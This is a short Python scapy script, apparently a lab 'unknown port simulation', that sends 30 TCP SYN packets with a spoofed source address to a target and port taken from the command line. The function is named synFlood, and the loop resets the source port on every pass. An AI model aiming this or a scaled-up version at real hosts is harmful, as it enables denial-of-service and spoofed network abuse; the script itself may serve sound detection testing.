from scapy.all import *
from scapy.layers.inet import TCP, IP
import time
import sys

src = "192.168.222.100"
tgt = sys.argv[1]
dest_port= int(sys.argv[2])

def synFlood():

    for sport in range(1025, 1055):
        sport = 1025
        L3 = IP(src=src, dst=tgt)
        L4 = TCP(sport=sport, dport=dest_port)
        pkt = L3 / L4
        send(pkt)
        print("Unknown Port!!! targeting: {} DestPort: {}\n".format(tgt,dest_port))
        time.sleep(0.1)

print("     \n###  Starting targeting {} with unknown port  ###".format(tgt))
print("     ###  Amount: 30   |   Delay: 0.1 ###")
synFlood()
print("     \n###  End of unknown port simulation  ###")
